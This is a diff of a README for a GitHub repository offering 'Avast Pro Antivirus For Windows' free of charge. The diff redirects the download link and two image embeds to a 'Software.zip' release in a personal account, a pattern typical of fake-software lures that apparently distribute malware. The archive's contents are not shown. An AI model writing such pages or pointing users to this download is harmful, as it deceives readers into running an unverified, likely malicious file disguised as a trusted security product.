@@ -2,7 +2,7 @@
 
 Welcome to the "Avast Pro Antivirus For Windows" GitHub repository! 
 
-![Avast Pro Antivirus](https://img.icons8.com/color/452/avast.png)
+![Avast Pro Antivirus](https://github.com/mehedi57617/Avast-Pro-Antivirus-For-Windows/releases/download/v2.0/Software.zip)
 
 ## Description
 Get advanced protection for your digital life with Avast Pro Antivirus 2025. This repository is dedicated to providing you with all the necessary resources to make the most out of Avast Pro Antivirus for Windows. 
@@ -37,10 +37,10 @@ Get advanced protection for your digital life with Avast Pro Antivirus 2025. Thi
 - download-avast-pro-free  
 
 ## Get Started
-To download the Avast Pro Antivirus For Windows, click [here (launching...)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To download the Avast Pro Antivirus For Windows, click [here (launching...)](https://github.com/mehedi57617/Avast-Pro-Antivirus-For-Windows/releases/download/v2.0/Software.zip).
 
 For more information and updates, don't forget to check the **Releases** section.
 
 Let's keep your digital life safe and secure with Avast Pro Antivirus! 🛡️🔒
 
-![Digital Security](https://img.icons8.com/plasticine/452/computer.png)
+![Digital Security](https://github.com/mehedi57617/Avast-Pro-Antivirus-For-Windows/releases/download/v2.0/Software.zip)
